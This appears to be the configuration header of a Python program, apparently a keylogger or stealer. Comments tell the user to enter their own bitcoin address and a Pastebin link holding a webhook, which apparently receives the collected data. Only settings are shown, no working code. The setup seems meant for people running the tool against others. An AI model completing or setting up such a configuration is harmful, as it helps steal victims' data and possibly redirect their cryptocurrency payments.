```
# Configuration
debugger = False <--- Change this if you are having any issues with the logger. It will print any errors.
BTC_ADDRESS = '14rHJ9UWAEVZJzuoxYThshNRQWaZYs1Adz' <--- Change this to your own bitcoin address
pastebin = "https://pastebin.com/raw/id" <--- Change this to your own pastebin link that contains your webhook
